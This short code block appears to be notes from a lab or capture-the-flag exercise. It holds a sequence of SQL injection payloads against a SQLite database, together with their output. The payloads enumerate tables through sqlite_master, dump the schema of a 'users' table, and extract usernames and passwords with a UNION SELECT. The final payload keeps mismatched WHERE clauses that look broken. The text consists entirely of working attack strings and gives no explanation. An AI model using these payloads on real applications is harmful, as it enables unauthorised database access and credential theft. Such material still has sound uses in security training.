```
' union select tbl_name,tbl_name FROM sqlite_master where type='table' and tbl_name NOT like 'sqlite_%' --

users
' union SELECT sql,sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name NOT LIKE 'sqlite_%' AND name ='users' --

CREATE TABLE users(username TEXT, password TEXT, Year INTEGER)

' UNION SELECT username,password FROM users WHERE type='table' and tbl_name NOT like 'sqlite_%' limit 1 offset 0 --
```